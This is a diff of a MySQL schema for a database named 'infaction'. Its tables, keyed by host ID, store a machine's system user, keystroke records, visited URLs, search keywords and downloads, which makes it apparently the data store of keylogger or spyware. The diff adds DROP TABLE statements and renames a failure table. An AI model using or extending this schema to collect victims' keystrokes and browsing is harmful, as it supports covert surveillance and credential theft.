@@ -1,6 +1,7 @@
 DROP database infaction;
 CREATE DATABASE `infaction` character set utf8  /*!40100 DEFAULT CHARACTER SET utf8 */;
 USE `infaction`;
+DROP TABLE  IF  EXISTS  `machine`;
 CREATE TABLE IF NOT EXISTS `machine` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `user` varchar(30) NOT NULL COMMENT '系统用户',
@@ -23,6 +24,7 @@ CREATE TABLE IF NOT EXISTS `machine` (
   unique  index(`hostid`)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 --联合主键需要一起作为外键
+DROP TABLE  IF  EXISTS  `keyboard`;
 CREATE TABLE IF NOT EXISTS `keyboard` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `hit` text NOT NULL COMMENT '敲击记录',
@@ -32,6 +34,7 @@ CREATE TABLE IF NOT EXISTS `keyboard` (
   constraint user_keyboard_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
+DROP TABLE  IF  EXISTS  `browser`;
 CREATE TABLE IF NOT EXISTS `browser` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `website` text NOT NULL COMMENT '浏览网址',
@@ -43,6 +46,7 @@ CREATE TABLE IF NOT EXISTS `browser` (
   constraint user_browser_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
+DROP TABLE  IF  EXISTS  `browser_url`;
 CREATE TABLE IF NOT EXISTS `browser_url` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `website` text NOT NULL COMMENT '浏览网址',
@@ -54,6 +58,7 @@ CREATE TABLE IF NOT EXISTS `browser_url` (
   constraint browser_url_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
+DROP TABLE  IF  EXISTS  `browser_keyword`;
 CREATE TABLE IF NOT EXISTS `browser_keyword` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `keyword` varchar(500) NOT NULL COMMENT '查询关键字',
@@ -63,6 +68,7 @@ CREATE TABLE IF NOT EXISTS `browser_keyword` (
   constraint browser_keyword_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
+DROP TABLE  IF  EXISTS  `browser_download`;
 CREATE TABLE IF NOT EXISTS `browser_download` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `url` varchar(500) NOT NULL COMMENT '下载地址',
@@ -73,10 +79,12 @@ CREATE TABLE IF NOT EXISTS `browser_download` (
   constraint browser_download_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
-CREATE TABLE IF NOT EXISTS `browser_faild` (
+DROP TABLE  IF  EXISTS  `browser_fail`;
+CREATE TABLE IF NOT EXISTS `browser_fail` (
   `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `hostid` varchar(50) not null COMMENT '主机ID' ,
-  `reason` varchar(255) not null COMMENT '失败原因' ,
+  `code` int(20) not null COMMENT '状态码' ,
+  `reason` varchar(100) not null COMMENT '失败原因' ,
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
   PRIMARY KEY (`id`),
   constraint browser_faild_id foreign key(hostid) references machine(hostid)
